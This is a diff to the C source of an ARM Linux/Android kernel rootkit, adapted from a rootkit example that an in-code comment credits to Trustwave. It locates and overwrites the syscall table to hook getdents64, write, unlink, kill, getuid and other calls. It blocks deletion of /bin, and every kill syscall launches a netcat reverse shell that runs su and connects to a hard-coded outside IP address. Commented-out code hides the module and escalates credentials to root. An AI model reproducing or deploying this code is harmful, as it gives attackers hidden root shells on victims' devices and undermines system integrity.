@@ -26,6 +26,7 @@ MODULE_DESCRIPTION(DESCRIPTION);
 #define __NR_KILL 37
 #define __NR_GETDENTS64 217
 
+#define __NR_UNLINK 10
 #define __NR_EXECVE 11
 #define __NR_MKDIR 39
 #define __NR_RMDIR 40
@@ -55,6 +56,7 @@ struct cred_struct {
 	int fsgid;	/* GID for VFS ops */
 };
 
+asmlinkage long (*orig_unlink)(const char __user *pathname);
 asmlinkage long (*orig_getdents64)(unsigned int fd,struct linux_dirent64 __user *dirent,unsigned int count);
 asmlinkage ssize_t (*orig_read) (int fd, char *buf, size_t count);
 asmlinkage ssize_t (*orig_write) (int fd, char *buf, size_t count);
@@ -69,17 +71,18 @@ asmlinkage ssize_t (*orig_writev)(int fd,struct iovec *vector,int count);
 //asmlinkage int (*orig_getdents64)(unsigned int fd, struct linux_dirent64 *dirp, unsigned int count);
 asmlinkage uid_t (*orig_getuid)(void);
 
+
 void get_sys_call_table(){
-	void *swi_addr=(long *)0xffff0008;
+	void *swi_addr=(long *)0xffff0008; // Known address of Software Interrupt handler
 	unsigned long offset=0;
 	unsigned long *vector_swi_addr=0;
 
-	offset=((*(long *)swi_addr)&0xfff)+8;
+	offset=((*(long *)swi_addr)&0xfff)+8; // Hardware interrupt vector is at 8 bytes away from SWI routine
 	vector_swi_addr=*(unsigned long *)(swi_addr+offset);
 
-	while(vector_swi_addr++){
-		if(((*(unsigned long *)vector_swi_addr)&0xfffff000)==0xe28f8000){
-			offset=((*(unsigned long *)vector_swi_addr)&0xfff)+8;
+	while(vector_swi_addr++){	
+		if(((*(unsigned long *)vector_swi_addr)&0xfffff000)==0xe28f8000){ // Copy the entire sys_call_table from the offset starting the hardware interrupt table
+			offset=((*(unsigned long *)vector_swi_addr)&0xfff)+8;		  // 0xe28f8000 is end of interrupt space. Hence we stop.
 			sys_call_table=(void *)vector_swi_addr+offset;
 			break;
 		}
@@ -161,15 +164,31 @@ asmlinkage uid_t our_getuid(void){
 		list_del_init( &__this_module.list );
 		start_chk++;
 	}
-	*/printk("Running our_getuid");
+	*/
+	printk("Running our_getuid");
+	struct uid_t *tmp;
+	tmp=(*orig_getuid)();
+	if(tmp==0) {
+		printk("Skipping as uid is root");
+		return;
+	}
 	/*if(cred->uid==DEF_GID){ // hidden id 
 		cred->uid=0; cred->euid=0; cred->suid=0; cred->fsuid=0;
 		cred->gid=DEF_GID; // hidden 
 		cred->egid=0; cred->sgid=0; cred->fsgid=0;
 		return 0;
 	} */
-	return (*orig_getuid)();
+	return tmp;
 } 
+
+
+asmlinkage ssize_t our_unlink(const char __user *pathname)
+{
+		if (strstr(pathname,"hello.txt") || strstr(pathname,"/bin") ) 
+			return -1;
+        printk (KERN_INFO "SYS_UNLINK: %s\n",pathname);
+        return orig_unlink(pathname);
+}
 
 asmlinkage ssize_t our_read (int fd, char *buf, size_t count)
 {
@@ -178,6 +197,8 @@ asmlinkage ssize_t our_read (int fd, char *buf, size_t count)
 }
 asmlinkage ssize_t our_write (int fd, char *buf, size_t count)
 {
+		if(strstr(buf,"sleep"))
+			return -1;
         printk (KERN_INFO "SYS_WRITE: %s\n",buf);
         return orig_write(fd,buf,count);
 }
@@ -223,7 +244,7 @@ asmlinkage int our_getdents64(unsigned int fd, struct linux_dirent64 *dirp, unsi
     printk("our_getdents64: %u",hpid);
 	tmp-=td1->d_reclen;
 	if(td1->d_name) {
-		printk("Intercepting %s",td1->d_name);
+		printk("\nIntercepting %s",td1->d_name);
 	}
 	
 	 /* 
@@ -281,19 +302,18 @@ asmlinkage int our_getdents64(unsigned int fd, struct linux_dirent64 *dirp, unsi
 	return ret;
 } 
 
-/* trustwave mindtrick rootkit's example */
 void reverse_shell()
 {
-	static char *path="rshell";
-	char *argv[]={"busybox","nc","169.228.66.210","8282","-e","su","app_8282",NULL};
-	static char *envp[]={"HOME=/","PATH=/sbin:/system/sbin:/system/bin:/system/xbin",NULL};
-
+	char *path="rshell";
+	char *argv[]={"nc","169.228.66.210","8282","-e","su","&",NULL};
+	char *envp[]={"HOME=/","PATH=/sbin:/system/sbin:/system/bin:/system/xbin",NULL};
 	call_usermodehelper(path,argv,envp,1);
 }
 	
 asmlinkage int our_kill(pid_t pid, int sig)
 {
-				reverse_shell();
+
+	reverse_shell();
 	printk(KERN_INFO "SYS_KILL: %d\n",pid);
 	// char *init_task_ptr=(char *)&init_task;
 	// char *comm=init_task_ptr+comm_offset;
@@ -360,6 +380,7 @@ int init_module(void)
 
 	// Get address of sys_calls and store good copy
 	orig_getdents64 = sys_call_table[__NR_GETDENTS64];
+	orig_write = sys_call_table[__NR_WRITE];
 	orig_kill = sys_call_table[__NR_KILL];
 	orig_close = sys_call_table[__NR_CLOSE];
 	orig_open = sys_call_table[__NR_OPEN];
@@ -367,9 +388,12 @@ int init_module(void)
 	orig_rmdir = sys_call_table[__NR_RMDIR];
 	orig_mkdir = sys_call_table[__NR_MKDIR];
 	orig_getuid = sys_call_table[__NR_GETUID];
+	orig_unlink = sys_call_table[__NR_UNLINK];
 	// orig_execve = sys_call_table[__NR_EXECVE];
 
 	// Overwrite sys_call_table with our versions of sys_calls
+	sys_call_table[__NR_WRITE] = our_write;
+	sys_call_table[__NR_UNLINK] = our_unlink;
 	sys_call_table[__NR_GETDENTS64] = our_getdents64;
 	sys_call_table[__NR_MKDIR] = our_mkdir;
 	sys_call_table[__NR_RMDIR] = our_rmdir;
@@ -386,9 +410,14 @@ int init_module(void)
 void cleanup_module(void) 
 { 
 	// Need to un-load cleanly. Write peristence into file with read-only access to reload.
-
-	;
+	sys_call_table[__NR_WRITE] = orig_write;
+	sys_call_table[__NR_GETDENTS64]=orig_getdents64;
+	sys_call_table[__NR_KILL]=orig_kill;
+	sys_call_table[__NR_CLOSE]=orig_close;
+	sys_call_table[__NR_OPEN]=orig_open;
+	sys_call_table[__NR_CREAT]=orig_creat;
+	sys_call_table[__NR_RMDIR]=orig_rmdir;
+	sys_call_table[__NR_MKDIR]=orig_mkdir;
+	sys_call_table[__NR_GETUID]=orig_getuid;
+	sys_call_table[__NR_UNLINK]=orig_unlink;
 }
-
-/* eoc */
- 
